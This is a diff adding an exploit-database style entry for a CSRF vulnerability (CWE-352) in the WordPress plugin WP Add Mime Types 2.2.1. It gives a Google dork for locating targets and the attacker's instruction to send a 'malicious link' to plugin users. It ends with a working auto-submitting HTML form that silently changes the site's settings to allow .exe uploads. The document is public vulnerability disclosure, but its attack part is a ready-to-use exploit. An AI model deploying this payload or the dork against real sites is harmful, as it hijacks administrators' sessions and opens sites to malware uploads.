@@ -1,0 +1,25 @@
+# Exploit Title: CSRF vulnerabilities in WP Add Mime Types Plugin <= 2.2.1
+# Google Dork: inurl:”/wp-content/plugins/wp-add-mime-types”
+# Date: 18 july, 2019
+# Exploit Author: Princy Edward
+# Exploit Author Blog : https://prinyedward.blogspot.com/
+# Vendor Homepage: https://wordpress.org/plugins/wp-add-mime-types/
+# Software Link: https://downloads.wordpress.org/plugin/wp-add-mime-types.2.2.1.zip
+# Version: 2.2.1
+# Tested on: Apache/2.2.24 (CentOS)
+# CVE : Fresh
+
+#About Plugin
+The plugin additionally allows the mime types and file extensions to WordPress. In other words, your WordPress site can upload various file extensions.
+#Vulnerable Description
+WordPress plugin WP Add Mime Types plugin 2.2.1 vulnerable to CWE-352.
+## CSRF Code
+Share this malicious link to the plugin user. Once he clicks the link, the mime type will automatically get updated. Here I shared a POC to allow exe files(application/x-msdownload) to be uploaded.
+<html>
+<body onload="document.forms[0].submit()">
+<form method="POST" action="http://IP/wp-admin/options-general.php?page=wp-add-mime-types%2Fincludes%2Fadmin.php">
+<input type="hidden" name="mime_type_values" value="exe    =    application/x-msdownload">
+<input type="submit">
+</form>
+</body>
+</html>
